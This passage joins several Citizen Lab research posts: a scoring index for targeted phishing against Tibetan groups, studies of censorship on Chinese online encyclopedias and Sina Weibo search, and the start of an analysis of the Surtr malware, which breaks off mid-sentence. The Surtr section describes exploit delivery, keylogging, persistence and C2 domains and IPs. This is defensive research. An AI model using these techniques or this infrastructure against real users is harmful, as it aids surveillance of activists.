contains minor code protection techniques\nalong with at least one advanced protection method such as rootkit\nfunctionality or a custom virtualized packer.\n\n\n2\nThe sample contains multiple advanced protection\ntechniques, e.g. rootkit capability, virtualized packer, multiple\nanti-reversing techniques, and is clearly designed by a professional software\nengineering team.\n\n\n\nTable 2: TTI Technical Sophistication Multiplier\nAlmost all submitted samples we have analyzed have a technical sophistication multiplier of 1.5 or less, with exceptions of commercial malware such as FinFisher and DaVinci, both of which would score 2.\nExamples\nHere we will review the four emails described in our blog post from July 26, 2012: Recent Observations in Tibet-Related Information Operations: Advanced social engineering for the distribution of LURK malware.\nIn each of these cases, the malware payload is a variant of Gh0st RAT using the LURK0 flag text. Gh0st RAT is well-known and has been extensively analyzed; its technical sophistication is 1.25 for the limited protection techniques it uses.\n“Droeshi”\nTargeting Sophistication: 3/5\nTechnical Sophistication: 1.25/2\nTTI Score: 3.75/10\n\nThis email was sent from what appears to be a compromised account of a Tibetan activist, and does not include a named recipient or sender. The malicious attachment also does not contain any content for social engineering purposes.\nWhile the content of the message is vague, the password and the sender name/address (not shown here for confidentiality reasons) are enough to demonstrate targeting customization.\n“Statement of the Kashag”\nTargeting Sophistication: 2/5\nTechnical Sophistication: 1.25/2\nTTI Score: 2.5/10\nThis email, with the subject “THE STATEMENT OF THE KASHAG ON THE SEVENTY-SEVENTH BIRTHDAY CELEBRATION OF HIS HOLINESS THE DALAI LAMA”, claims to be from a real Tibetan organization. The only content of the email is a password based on the content of the email that would be easily recognizable by Tibetans: the birthday of the Dalai Lama.\nWhile the content is relevant, this email is more questionable than the previous one. In addition to the lack of email body content, it is pretty clear to the trained eye that the From: email address was forged:\n\n“The concept notes”\nTargeting Sophistication: 1/5\nTechnical Sophistication: 1.25/2\nTTI Score: 1/10\nThe third email of this group claims to be from a representative of the Office of Tibet, but is very vague in wording and has a number of attachments. While the malicious Excel file claiming to be related to the The European Instrument for Democracy and Human Rights (EIDHR) call for proposal is relevant, it is also in an incorrect file format (Excel OLE, and not the Open XML format the .xlsx extension claims to be) that will not open as-is. Requiring manual changing of the file name is a very strong warning sign that something is wrong.\nOne of the emails was even misspelled:\n\nFor all of these warning signs, this email scores very low, even though the malware included is the same.\n“August visit of South African group”\nTargeting Sophistication: 5/5\nTechnical Sophistication: 1.25/2\nTTI Score: 6.25/10\nThe last of the LURK0 emails contains very specific personal details about a group’s visit to Dharamsala, and appears to have been stolen and repurposed from a genuine conversation. The email is written as a request to the Tibetan organization for help, describing the trip. The malicious attachment contains an authentic itinerary, which is displayed after the victim is infected.\nFor being a well-written email that is in many ways as legitimate as it can be, and requires inside information, this email scores 5 out of 5.\nTTI Scores and Study Data\nPlotting the TTI targeting score for all of the samples we have received as part of the study gives an idea of how frequently advanced targeting methods are used. In total we are working with 10 different human rights organizations. Eight of these groups focus on China-related rights issues (categorized as “China Groups). Five of those groups focus primarily on Tibetan rights (categorized as “Tibet Groups”). The remaining two focus on a variety of human rights issues (categorized as “Rights Groups”).\nOut of 750 email threats received, only five score a full 5/5 on the TTI targeting base value. However, well customized email lures (targeting scores 3-4) are common. The majority of our submissions have come from Tibetan organizations.\n\nFigure 1: TTI Base Targeting Score For All Email Submissions\nAs there is less variance on the technical multiplier as there is on the targeting base value, the score clusters are still present in the full TTI score. Even without technically superior malware such as FinFisher, high TTI scores are still possible when an attacker cares enough to steal and use insider information as part of the attack.\n\nFigure 2: TTI Score For All Email Submissions\nOut of the 750 submissions, 599 emails have been assigned a score greater than zero.\nMean targeting base score: 2.6\nMedian targeting base score: 3.0\nMean technical multiplier: 1.24\nMedian technical multiplier: 1.25\nMean TTI: 3.23\nMedian TTI: 3.0\nLimitations\nThe Targeted Threat Index is currently a test metric, but it does give insight into the distribution of how sophisticated the threats are. As we build up a greater collection of scored samples, including those from other groups and public repositories such as Contagio, areas for revision may appear.\nAverage TTI scores in our case may be skewed due to the self-reporting method we use in the study. Very good threats are less likely to be noticed and reported while being sent to far fewer people, and low-quality emails are much more likely to be sent in bulk and stand out. We are more interested, however, in worst-case (highest) scores and not in comparing the average threat severity between organizations.\nFinally, this metric is calculated based on the technical sophistication of the payload, not on the exploit. There is currently no method to modify the TTI score in a way similar to the temporal metrics used by the CVSS metric. A temporal metric could be added to increase the final TTI value for 0-day vulnerabilities, or possibly to reduce the score for exploits that are easily detectable due to a public and well-known generation script, e.g. Metasploit.\nAbout The Author\nSeth Hardy is a Senior Security Analyst at the Citizen Lab, Munk School of Global Affairs, University of Toronto.

    "text": "\n\t\t\t\tBy Jason Q. Ng\nIn 2008, Baidu’s chief scientist William Chang said, “There’s, in fact, no reason for China to use Wikipedia . . . It’s very natural for China to make its own products.” Today Hudong (baike.com) and Baidu Baike (baike.baidu.com) greatly eclipse the Chinese-language version of Wikipedia despite (or because of) the censorship known to take place on the sites. However, identifying outright instances or patterns in censorship can be difficult due to the (mostly) user-generated nature and oversight of the content. Instead, this project attempts to perform a large-scale comparison of the three services, matching thousands of Chinese-language Wikipedia articles with their in-China counterparts, in order to identify the “content gaps” in the two baike (Chinese for “encyclopedia,” which we use to refer to Hudong’s and Baidu’s online encyclopedias). Censorship—or at the very least anomalies in the generation of content—might be identified by articles that don’t exist, “protected” articles that are not editable by regular users, and by articles that are much shorter than those on Wikipedia China. The reason might  is emphasized is due to the distributed oversight nature of these online encyclopedias, where not only governments but also companies and users get to play the role of content gatekeeper. This decentralization makes attributing who is responsible for apparent censorship more difficult, a topic which this report will explore in detail by examining how it functions in these online encyclopedias.\nIn addition to the exploring the difficulties in identfying censorship, this post will also lay out the research methodology of the article matching, some of the initial results, and the next steps to be taken in the coming months as we continue to analyze this data and expand the project. As the data for this project has just been collected, this report is more data dump than fully-composed, critical analysis (see the final section for future avenues of research and thinking), but hopefully it serves as an introduction into the sorts of quality data available in this project.\nTables with lists of articles that are protected/locked on Wikipedia, Baidu Baike, and Hudong as well as a list of articles that are found on Wikipedia China but not found on the two baike are below. You can jump directly to them by clicking the links in the previous sentence, but as the data is still preliminary and has many limitations, one might be best served reading through the following sections.\nBaike: Chinese encyclopedias\nAs William Chang of Baidu foretold, mainland Chinese netizens have gravitated toward local products such as Hudong and Baidu Baike, leaving Wikipedia China to be edited and read primarily by users in Taiwan, Hong Kong, and the rest of the Chinese diaspora. Today, in terms of raw visitors and article count, Hudong and Baidu Baike dwarf Wikipedia China, which has roughly 700,000 articles versus over 5 million in each of the two baike. Certainly, while China’s sporadic blocking of access to Wikipedia at various points over the past ten years has certainly been a factor in limiting Wikipedia China’s growth among mainland users, Baidu and Hudong’s dominance may be more credited to Baidu’s entrenched position as the dominant search engine in China (thus allowing for cross-site “partnerships” and synergies1) and Hudong’s bevy of features built into its custom wiki and social networking platform.\nThough the baike are incredible sources of information on China, they have been dogged by allegations that they have liberally “borrowed” content from other websites, including Wikipedia–a not damnable offense in and of itself since Wikipedia’s content is free to share and re-use, but the two baike are for-profit and inform users that any content contributed is property of Hudong and Baidu. In the past, Baidu was noted as the worst offender, plagiarizing from not only Wikipedia without credit but also from Hudong.2 Though the goal of this project is not to analyze these plagiarization claims and to quantify the amount of shared content among the three encyclopedias, the data generated from the matching of articles as explained in the methodology section below would allow someone to easily perform this sort of follow-up analysis once the data from this project is cleaned up and released.\nThe difficulties of identifying censorship in an environment with distributed oversight\nThis project began with a question: everyone “knows” Hudong and Baidu Baike, like all Chinese websites, have to restrict certain kinds of content on their websites, but is it possible to empirically prove that censorship is taking place on the sites? Thinking about different ways of testing our assumption with the publicly available data on the websites drove this project.\nFirst, what would we consider signs of censorship on Hudong and Baidu Baike? The most obvious would be the lack of certain articles on topics that are known to be notable. Thus, using Wikipedia China as a control, we can propose that if an article on say 上海帮 (The Shanghai Gang) exists on Wikipedia China, barring censorship, it should exist on Hudong and Baidu Baike, especially since Hudong and Baidu Baike have a much larger library of entries. However, attributing the lack of an entry due to censorship is not a perfect science since Wikipedia China itself isn’t a perfect control–though entries in Wikipedia China are assumed to be of interest to Hudong and Baidu Baike users, and thus should have articles in those encyclopedias, one should keep in mind that Wikipedia China does tend to have a Taiwanese bend due to its userbase. However, using missing articles as a potential indicator for possible censorship–especially if the article that is missing is a long one–is a reasonable start.\nSecond, comparisons could also be made between the length of the articles between the encyclopedias. For instance, an article might exist on all three services, but they might be drastically shorter than their Wikipedia counterpart. For instance, the main body of the Wikipedia entry for 艾未未 (Ai Weiwei) is over 20,000 characters long (spaces removed) while the Baidu entry for him clocks in at 2,000 characters and the Hudong one at 3,500–this is despite the fact that article lengths for the Baidu articles sampled in this project are on the whole longer than Wikipedia’s: the mean Wikipedia China article length is 8,174 characters (median: 4,207) while Baidu’s is 12,679 (median: 9,029). Discrepancies of the sort in the Ai Weiwei article might simply be a case of greater interest in the topic outside mainland China than within, or, again, it might be another potential indicator of censorship.\nThird, some especially sensitive or controversial articles are unable to be edited except by users with much higher privileges than ordinary members. Being unable to change an article is not in and of itself a sign of censorship; for instance, Wikipedia “protects” certain articles to prevent vandalism and pointless back-and-forth “edit wars.” Baidu and Hudong no doubt have similar intentions in mind as well, but what matters here is matter of transparency–while Wikipedia publishes a list of all protected pages, as far as we can tell, no such corresponding list exists for Hudong and Baidu Baike–and authority. Was it the choice of editors and users at Hudong and Baidu to classify certain articles as locked or was the decision made higher? Was there an open discussion of such matters or was a list handed down from somewhere above? Interviewing regular users of Baidu Baike and Hudong might provide insight into such questions, but for now, we have some data to start with.\nFinally, there are more subtle ways to disrupt access to information, many of which we will no doubt uncover as we continue to sift through the data. One that we’ve noticed is the “failure” by Hudong and Baidu to redirect certain article titles the same way that Wikipedia does. For instance, a search for 艾神, a laudatory nickname meaning “God Ai” for Ai Weiwei, properly redirects to the Wikipedia article for him. Hudong and Baidu Baike don’t perform such re-directs. Again, whether this is a conscious decision or merely an inadvertent one cannot be answered by looking at this one example. However, by looking at such cases in the aggregate one might be able to make a more legitimate claim that something might be going on.\nMany new media outlets such as Sina Weibo privilege users with the ability to generate the content that goes on the website–in essence, to be not only their own programmer or broadcaster but also the producer. However, because such websites host their users’ content, they are also in charge of regulating and ensuring that such content complies with all Chinese laws–regardless of how vague such regulations might be. Thus attributing censorship that takes place on these sites can be unclear–is it the government that mandated certain topics are off-limits or is it the company that restricts the content?–an intentional feature of the decentralized system of information control that Chinese authorities have developed.\nCensorship is further distributed on the baike because now not only are users their own programmer and producer, but they also serve in an oversight capacity as an editor. Unlike Wikipedia, users who aren’t registered can’t begin editing and creating articles, but for the most part, registered users can edit most general articles, and as they engage with the site longer, they achieve greater and greater levels of ability to edit and oversee the website. Thus, there could are always at least three potential reasons for why an article doesn’t exist, an article is shorter, or an article is locked on Hudong or Baidu Baike: government entities, private companies, or users themselves. Judging whether or not these factors are genuine instances of governmental censorship or due to explainable, organic reasons can be quite tricky. Because of the multiple layers of oversight, what may appear to be outright censorship may be a less malicious (though no less pernicious) case of self-censorship.\nMethodology\nAs mentioned, this project is a large-scale attempt to quickly and automatically match thousands of Wikipedia China articles with their corresponding Hudong and Baidu Baike entry. A script was developed which did just that, taking a keyword, locating the correct Wikipedia article and scraping the desired data, and then repeating the process for Hudong and Baidu, respectively, before moving on to the next keyword–essentially relying on Hudong and Baidu to perform the proper title matching or, if the title did not match exactly, redirect to the appropriate article.\nZhichun Wang, Juanzi Li, Zhigang Wang, and others at the Computer Science Department at Tsinghua University have already made great strides in “knowledge linking” between English Wikipedia and Hudong/Baidu Baike, and their approach to matching articles across different languages using machine learning to read semantic information is well beyond the scope of this report. However, techniques from their work may be employed in the future, though the current title matching approach employed for this projecy is already a fairly robust solution as is–especially since we are dealing with only one language. In “Cross-lingual knowledge linking across wiki knowledge bases,” Wang et al. reported that simple title matching gave them a precision percentage in excess of 99% even when having to translate from Chinese to English; however the recall rate was an atrocious 32%.\nThe data collected for this project still has to be evaluated properly, but thus far results seem very promising. Out of 5,143 keywords tested, Hudong and and Baidu each successfully found or redirected us to an appropriate article 3,539 and 3,600 times respectively, a recall rate of at least 68%–a number which is likely much higher once we account for the fact that the script also attempted to use search results to identify and match instances when the keyword was found in the returned search results’ snippets (the article titles and summaries).\nOf these 3,500+ times, the exact title–meaning a character for character match–was made between Wikipedia and Hudong 2,037 times, and 2,080 times between Wikipeda and Baidu Baike. If one assumes that an exact match in the article title is a match in the article content as well, then the precision rating for matched articles is nearly 60% already, and that’s not yet taking into account all the articles titles which are only slightly different between the services, either due to different styling conventions (e.g. Wikipedia’s article on national universities is titled with traditional characters [國立大學] while Hudong and Baidu both use simplified [国立大学]) or other minor variations. Overall, the matching procedure, at least for the terms tested thus far, seems more than acceptable for the goals of this project, though of course attempts will be made to verify the precision and increase the recall rate.\nAs a test of the script and the methodology, a sample of 5,143 keywords involving a mix of topics known to be sensitive and those known to be popular were generated from five different sources: the titles of articles protected by Wikipedia (282); article titles from the list of Wikipedia China articles on GreatFire.org’s watchlist of censored Wikipedia pages (489); article titles of the top 1000 most viewed articles on Wikipedia China in April 2013 (995 after a few Wikipedia meta-pages were removed); the titles of articles that generated more than a total of 10 combined views on August 1, 0:00-1:00 and 12:00-13:00 (3,470); and finally, the only non-Wikipedia source, a list of keywords from the website Blocked on Weibo previously confirmed to have been prevented from returning search results on Sina Weibo (840). Some of the final sample of keywords appeared on multiple lists, and the overlap of four of the sources is shown below (the source of words from August 1 were dropped because 5-way Venn diagrams are not as pretty…).\n4-way Venn diagram showing overlap of sources used for keywords (not shown: keywords taken from most viewed Wikipedia China articles on Aug 1)generated with Venny\nThe following variables were scraped from all three encyclopedias: length of article, URL, title of the article (which can differ from the URL), locked/protected status, last modified date, and a number of other meta variables. From Hudong and Baidu, other variables included the number of “likes” (that is positive votes that the page was “helpful”) and number of edits. Variables unique to Baidu were pageviews for the article, and whether or not the page contained multiple entries (unlike Wikipedia, Baidu Baike doesn’t serve up “disambiguation” pages when the user searches for a broad term which could refer to multiple topics, and instead serves up all the entries on a single page; see for instance this entry for “Jordan” which includes the basketball player Michael Jordan as well as the country Jordan). Variables unique to Hudong were number of editors and the error message given when trying to edit a locked page–either 对不起，您的题目中含有不当内容，请检查? (“Sorry, the topic contains inappropriate content, please check?”);  您不能编辑敏感词条 (“You are not allowed to edit sensitive entries”);  您不能编辑普通敏感词条 (“You are not allowed to edit general sensitive entries”).\nProtected, missing, and censored(?) content\nAs mentioned previously, an article that is protected or locked doesn’t necessarily mean that it is being censored–Wikipedia often uses article protection as a means to prevent malicious behavior. However, the locking down of articles itself can be abused and used in a malicious manner, especially if the decision to do so is non-transparent, arbitrary, and/or doesn’t reflect the sentiment of the group. In such cases, Wikipedia fortunately has active “talk pages” which allow all users to debate and contest such issues. Baidu Baike also has discussion pages which allow users to to something similar: for instance, here’s one for the entry on the United Kingdom wherein users quibble about whether or not England can lay claim to being the place where the first “bourgeois revolution” took place (the consensus was no, the Dutch Revolt came before it). However, many protected Baidu Baike entries contain no such talk pages. For instance, trying to reach Xi Jinping’s talk page returns an error message. Hudong eschews separate talk pages in favor of comments at the bottom of each entry. However, again, oftentimes for sensitive and/or protected entries, there is no opportunity to leave your comment; the comments box simply doesn’t appear.\nFurthermore, while the list of pages protected by Wikipedia is published by the site, as far as we can tell, no such list exists for Hudong or Baidu Baike. Thus, even with he caveats noted above about how the articles in the following three tables don’t necessarily conclude that censorship is taking place in those entries, this exercise still seems like a useful one if only to make such information publicly available. Again, proper analysis is yet to be done on what is protected/locked and what sorts of patterns exist in the three different encyclopedias approaches to article protection.\nNote: the machine translations come from Google Translate.

nine characters or less (or four double-byte Chinese characters) keywords which successfully matched to an entry on Wikipedia, but when searched on Hudong or Baidu Baike, returned no matching results. As mentioned previously, the matching algorithm is still extremely simple, so some of these keywords may indeed have appropriate entries on Hudong or Baidu Baike. For instance, the table reports that the movie 戀夏500日 (500 Days of Summer) is not found on Baidu or Hudong. However, some manual digging uncovers that the movie is listed under the title 《和莎莫的500天》 and the Wikipedia one must be a Taiwan or Hong Kong-specific one. Thus, the below will no doubt contain false positives for terms it failed to find due to flawed searching on our part. Thus, the below is merely an initial stab at trying to uncover the content gaps in the two baike and will be refined in the coming months.\nThe first column is the keywords used to test, the third is the title of the Wikipedia article that was found (which may sometimes vary from the initial keyword depending on how Wikipedia interprets the keyword and handles the redirecting to what it thinks is the proper article), and the last two columns indicate whether or not that Baidu or Hudong located a matching article for the keyword.\nNot surprisingly, a number of the entries appear to be related to Taiwan, which makes sense since the largest share of Wikipedia China readers and contributors come from Taiwan while Hudong and Baidu are primarily mainland China users. Thus, a number of Taiwan-related articles in Wikipedia China may not to considered noteworthy to mainland users, explaining why they are not found in Hudong or Baidu. However, others are more clearly omitted for political or prurient reasons.\nThe same caveat about the machine translations from above applies here. Do not disseminate the machine translations without first verifying if they are correct. We are in the process of confirming the translations in the coming weeks and months.\n\nArticles found on Wikipedia China but not on Hudong or Baidu Baike\n\n\n\n\n\n\n\n\n\n\n\nKeyword searched +

However, at some point, as the keywords become ever more obscure and less common, we’ll no doubt see diminishing returns after expanding the keyword list too far.\nUsing the other variables we’ve collected will also make for interesting analysis later on. For example, models could be created to predict what kinds of articles are most likely to be protected, or for spotting articles that have abnormally small numbers of edits and article lengths. A discussion of what users are trying to express when they vote a particular entry as helpful would also be worthwhile. For instance, the most liked article on Hudong was one for a banking executive while the top ones on Baidu are mostly pop-related: Jacky Wu, Michael Jackson, the Japanese manga Detective Conan, singer Yang Mi, Jay Chou, and… Mao Zedong, with over 236,000 thumbs ups–though all of them were blown out of the water by the Korean group 2NE1, whose Baidu Baike article was liked nearly 2 million times. What are users trying to say when they mark something as helpful by clicking the thumbs up icon on each baike service? For instance, what can we conclude from the fact that more people have classified Bo Xilai’s entry on Baidu and Hudong as “useful” than they have for Xi Jinping’s?  Should we think of “likes” for particular pages as an alternative way netizens can actively or passively signal their endorsement of a topic’s existence or article’s sentiment even if the content is drastically different from a more “neutral” source like Wikipedia?\nBy looking not only at what content and data doesn’t exist on baike, but also at the content that does, this project will investigate what knowledge and information is fit for public display. If articles are shorter on Hudong and Baidu, what information do they carry? Does this information reveal anything about the authors’ intentions? By examining the topics and articles that are left visible in these baike and considering the motivations behind those who seek out, view, edit, and approve of these articles, this project hopes to offer a more nuanced view of the typical narratives about censorship in China. Trying to understand what sorts of expressions netizens are making via these online encyclopedias, despite whatever censorship might be taking place, is as interesting as the potential censorship itself. This project will hopefully push us to once again consider the many complexities when discussing information control in environments where oversight of content has been decentralized to companies and users–an environment which makes it increasingly harder to identify traditional instances of censorship.\n\n1. If you search for most general topics on Baidu, links to Baidu images, search, videos, shopping, bulletin boards, answers, and its own encyclopedia are among the top results. For example, here’s a search for 手机 (cell phone): Baidu links make up more than half of the first page of results, including a hit to Baike. When you search for celebrities and political figures, Baidu Baike is again always among the top results, if not the very first one. Hudong is often not found on the first page of results–if at all. Here’s a search for Xi Jinping. Notice the message at the top in bold (根据相关法律法规和政策，部分搜索结果未予显示。) stating that the results have been filtered. Those that are returned are all state media links (Xinhua, People’s Daily, China Daily, CNTV/CCTV)–except for Baike which inherits the top spot. Even for searches of people that are not filtered, Baike still almost always gets top billing and Hudong is often relegated to later in the results–though often not due to any failure on Hudong’s part. For example, the same search for 周恩来 (Zhou Enlai) on Google has both Hudong and Baidu Baike in the top three results (Wikipedia garners the top spot). All this is to say that while giving preference to one’s own services is not some unprecedented online tactic (see the outcry in 2010 when Google tweaked its searches to prioritize YouTube and other internal Google-owned content above other comparable websites), it does seem like there is something inherently baked into Baidu’s search algorithm that either intentionally or unintentionally penalizes Hudong’s articles compared to Baidu Baike and others. However, more rigorous examination is needed before a conclusion about how real or serious that penalty can be made.\n2. For example, here’s an article on cloud seeding that was featured on Hudong on August 7, 2013. It’s section on the costs of cloud seeding are copied word for word in Baidu Baike on the same topic (starts with “一种是用飞机把干冰等冷却剂撒播到云中”). If you look at the version histories, the Hudong version that contains this section predates Baidu by nearly four years. For Wikipedia copying, take a look at each respective encyclopedia’s entry on 利玛窦 (Matteo Ricci). Here’s a comparison of what is shared between Wikipedia and Hudong today, and Wikipedia and Baidu Baike today. As you can see from the matching bits, Wikipedia and Hudong share much greater overlap, and if you go through the historical records, you can identify that Hudong added the majority of such material in the May 11, 2008 edit. If you take the Apr 27, 2008 version of the article from Wikipedia and compare the two, you’ll notice just how closely the two mirror each other. The same can be done with Baidu Baike: a comparison of the differences between the Aug 29, 2006 Wikipedia article on Matteo Ricci and the Sept 6, 2006 Baidu Baike one. The overlap is stark and damning.\nAgain, this is not rigorous at all, merely a few cases that I have stumbled upon and require more rigorous examination before deciding whether the claims of plagiarism by Baidu and Hudong are unfounded, incidental (a few novice users unclear about citations), or systemic (either intentionally directed or through willful ignorance and refusal to correct it by those in charge).\nJason Q.

    "text": "\n\t\t\t\tDownload PDF\nBy Jason Q. Ng\nThanks to the excellent work being done by researchers and journalists at China Digital Times, GreatFire.org, and many others, there has never been more information about what is being censored online in China. However, what is less discussed and written about are instances when the censors withdraw keywords or topics from their censorship watchlists. And though the relaxing of certain restrictions may not actually represent actual greater freedom of expression online if they are followed up with even more sophisticated forms of censorship, it is still worth monitoring what does get changed–even if only for hints at the political motives behind such changes (for instance the unblocking of Bo Xilais’ name in the run-up to his corruption trial).\nThe Citizen Lab’s China Chats project was one model attempt at identifying changes over time in censorship and surveillance in two Chinese chat clients, and using the set of 4,256 sensitive keywords extracted and decrypted from those chat clients in that project, we have been testing changes in search keyword censorship on Sina Weibo these past two months. We performed four such tests each roughly 3 weeks apart, recording what Weibo’s response was when we tried to search for a particular keyword. The below chart (click through to open a a link to an interactive version of it) breaks down the 3,311 unique words* into three categories:\n\nnot blocked, meaning they returned search results;\nexplicitly blocked, meaning they returned a clear message stating that censorship was taking place (“According to relevant laws, regulations and policies, search results for [the blocked keyword] can not be displayed.”);\nno results, meaning that there could genuinely be no results or that the term is being implicitly censored\n\nclick through to open a a link to an interactive version of the chart\nAs noted in a previous post, a number of words were unblocked between our first test on June 6 and second test on June 29–most having to do with the June 4/Tiananmen Square anniversary. However, the trend continued in our third test on Jul 23, with an additional 46 keywords being essentially unblocked (going from explicitly censored to having search results). You can click through to the interactive chart to show the words that were unblocked in each test. Our fourth test showed a stabilizing of this unblocking of explicitly censored keywords trend, but surprisingly showed a marked increase in words being implicitly censored (returning no results).\nHowever, a preliminary re-test of those words shows that a large number of them have since returned to having results, so it may merely have been a temporary change in the search algorithm for handing certain words or perhaps there was a shake-up in the list of words that were earmarked for “no results” before Sina decided to revert most of them back–though not all. For instance, 批发K粉–“wholesale ketamine”–was explicitly censored on the first two tests before returning 159,194 results on our third test. On our fourth test, the term was one of the many that switched from having results to having none–which is still the case as of today, and a likely receiver of implicit censorship status.  Thus, no conclusions about the fourth test’s data on potentially implicitly censored keywords should be made until a follow-up test is completed.\nclick through to open a a link to an interactive version of the chart\nThe above chart shows a more granular view of the changes between each test: keywords that went from one of the three categories in the first chart above to a different category were identified as having their block status changed. This second chart breaks down the five** ways that a keyword could change block statuses from one test to another. Again, clicking through to the interactive version allows you to see which keywords are in each category. Now we can see which keywords were unblocked from one test to another as well as the few that were added to the block list. For instance, try clicking the red partition on the middle bar. You’ll see three terms, including not surprisingly, the legal scholar and rights activist 许志永 (Xu Zhiyong), who went from having over 16,000 results on the first to test to being explicitly blocked on the third after he was arrested on July 16.\nAs noted above, the third bar, which compares the third and fourth tests appears anomalous due to the much higher proportion of words that went from having results to no results which may or may not be purely temporary. The having results to no results categories and vice versa are further elevated because most of the keywords in these two categories went from only a handful of results to none or from none to a few–both cases which could be plausibly explained for organic reasons rather than outright censorship. If we filter out keywords that returned more than 100 results before or after experiencing the change in block status, we are left with three, four, and fourteen keywords which went from more than 100 results to zero in the three respective comparisons of tests; and three, five, and six keywords which went from zero results to over a hundred in the following test in the three respective comparisons. Thus, making definitive statements about changes in block status involving keywords which go from or to zero results are a bit murkier because in theory they could happen that way outside of censorship (people could delete or make posts with that keyword).\nHowever, we can conclusively say that the list of keywords that are being explicitly blocked appears to have stabilized in our most recent tests.*** Further testing will reveal whether or not there are any other shakes to the Sina Weibo system equivalent to that which took place after June 4.\n\n* You can read more about the rough methodology for classifying unique and non-unique keywords in footnotes 1 and 2 to this previous Citizen Lab blog post: Using the China Chats surveillance/censorship keyword list. However, as the data from these tests show, filtering out all redundant keywords to uncover the unique keywords which actually trigger the censorship is rather difficult without knowing the list of censored keywords in advance (which would make this whole exercise pointless). Thus, the lists of keywords in these charts contain at least a few words which share the same words which trigger censorship. For the most part though, the filtering performed seems to have done an acceptable job at weeding out the major trigger words shared by many words.\n**There are technically six possible pathways, but in our tests no keywords went from implicitly blocked to explicitly blocked.\n***A fifth test run through a Chinese VPN on Aug 20 showed no difference in the list of words explicitly blocked compared to the fourth test run on Aug 17 from here in Canada.\nJason Q.

    "text": "\n\t\t\t\tDownload PDF\nby Katie Kleemola and Seth Hardy\nBackground\nAs part of our ongoing study into targeted attacks on human rights groups and civil society organizations, the Citizen Lab analyzed a malicious email sent to Tibetan organizations in June 2013. The email in question purported to be from a prominent member of the Tibetan community and repurposed content from a community mailing list. Attached to the email were what appeared to be three Microsoft Word documents (.doc), but which were trojaned with a malware family we call “Surtr”.1 All three attachments drop the exact same malware. We have seen the Surtr malware family used in attacks on Tibetan groups dating back to November 2012.\nDelivery Mechanism\nWhile the malicious attachments appear to be DOC files due to their file extension, they are actually RTFs crafted to exploit a vulnerability in Microsoft Word: CVE-2012-0158.\nThis particular vulnerability was first exploited in early April 2012 and a patch was released by Microsoft on April 10, 2012. Currently, the sample is detected as malicious by 34 percent of antivirus (AV) engines on VirusTotal (VT).\nThe malicious attachment is created using a shared template that we have seen used against multiple Tibetan groups. This template was created in March 2013 and, instead of specifically using the vulnerable ActiveX controls described in the vulnerability description, it utilizes the Chartspace Office Web Component. This component either suffers from the same vulnerability or uses one of the named ActiveX controls resulting in the attacker being able to execute malicious code.\nFigure 1: Hexdump of the malicious attachment\nAlthough CVE-2012-0158 was first published and used in the wild in April 2012, samples using this template were only initially detected by three AV engines (on VT). Therefore, while a third of AV engines had a detection signature for CVE-2012-0158 as late as April 2013, it was possible to design a document using a year old vulnerability that was recognized as malicious by very few AV products. This number has since risen and it is currently being detected by 34 percent of the AV products listed on VT.\nThis vulnerability highlights the need to keep both operating systems and applications up to date as well as to exercise vigilance concerning links and email attachments.\nMalicious attachments with this template all use a similar dropper which originally drops the payload to the temporary file directory.\nPayload\nSurtr creates either a new explorer or iexplore process and injects itself into this new process using CreateRemoteThread function.\nIt also creates the following folders:\n%ALL USERS%/Application Data/Microsoft/Windows/123\n%ALL USERS%/Application Data/Microsoft/Windows/Burn\n%ALL USERS%/Application Data/Microsoft/Windows/LiveUpdata_Mem\nIt creates multiple copies of the payload including in both the Burn and LiveUpdata_Mem folders. The copy in the Burn folder is called [VICTIM COMPUTER NAME].dll and there are three copies in the LiveUpdata_Mem folder whose names consist of 6 random alphanumeric characters which are then appended with .dll, _Fra.dll and _One.dll. These copies will differ from the original payload dropped in the %TEMP% folder by filling the resource section with varying amounts of 00 bytes. This also results in the malware having a much larger file size (30-50mb) possibly in an attempt to evade antivirus heuristics.\nSurtr connects to a command and control server (C2) and downloads a stage two component to %ALL USERS%/Application Data/Microsoft/Windows/Burn/_[VICTIM COMPUTER NAME].log. This particular sample connects to internet.3-a.net on port 9696.\nIn May 2012, internet.3-a.net resolved to the same IP (184.82.123.143) as android.uyghur.dnsd.me, which is a C2 used in Android malware attacks that targeted the Tibetan community as previously documented by the Citizen Lab.\nThe stage two component that was downloaded in this particular case has an internal name of x86_GmRemote.dll, however we have seen an alternate stage two used with the name Remote.dll as well. Our analysis in this post focuses on the GmRemote variation as it has been seen in multiple attacks.\nSurtr’s capabilities include listing of file directories and contents on the victim computer and any USB drives connected to a victim machine, viewing web cache, executing remote commands and logging keystrokes.\nIn order to store temporary information, Surtr creates the following folders:\n%ALL USERS%/Application Data/Microsoft/Windows/MpCache\n%ALL USERS%/Application Data/Microsoft/Windows/nView_DiskLoydb\n%ALL USERS%/Application Data/Microsoft/Windows/nView_KeyLoydb\n%ALL USERS%/Application Data/Microsoft/Windows/nView_skins\n%ALL USERS%/Application Data/Microsoft/Windows/UsbLoydb\nFor example, in nView_DiskLoydb, a file called FileList.db that contains file and directory listings will be placed and nView_KeyLoydb will contain text files with keylogger output. The keylogger output is disguised by adding a constant to the ordinal value of the character.\nThis data can then be sent to the C2. It is compressed using zlib DEFLATE so the network traffic is not human readable without decompression.\nIt can also download additional malware onto the victim computer, which can provide attackers with further abilities like accessing the victim computer’s webcam or microphone. In particular, we have seen Surtr used in conjunction with the Gh0st RAT derived LURK0 malware.\nFor persistency, Surtr adds a key to the registry to ensure it runs when the infected computer is restarted. It also stores its C2 information and a campaign code in the registry.\nDepending on the configuration, Surtr will either create multiple registry keys in Software\\Microsoft\\Windows Media in HKU (hkey users) with text data or a single key called XC consisting of binary data. These are usually xor encrypted with a key of 0x1.\nFigure 2: Encrypted data in XC key\nFigure 3: Decrypted data (note: e0 25 is 0x25e0 which is 9696 in hex)\nOther Samples & Variations\nWe have seen a large number of similar samples sent to Tibetan groups that use the same stage two (GmRemote) and communicate with the following C2s: dtl.dnsd.me, dtl.eatuo.com, dtl6.mooo.com and tbwm.wlyf.org. These C2s were also used in previous attacks documented in an earlier Citizen Lab post on LURK0 malware targeting the Tibetan community.\nOne particular sample (md5: ad9e5f79585eb62bc40b737e98bfd62e) which connects to C2 domain dtl6.mooo.com (which resolved to the same IP as the other dtl domains mentioned above) on port 6178 was seen to download LURK0 malware after the initial Surtr infection. This LURK0 sample had the campaign code ZQ6 that connects to C2 domain tbwm.wlyf.org on port 3103. This domain also resolved to the same IP as the dtl domains.\nWe have also found reports of other Surtr stage 2 (GmRemote) samples that have campaign codes which suggest they may be targeted at commercial and government targets.\nThe first sample was found via ThreatExpert. It uses campaign code kmlg-0308, and 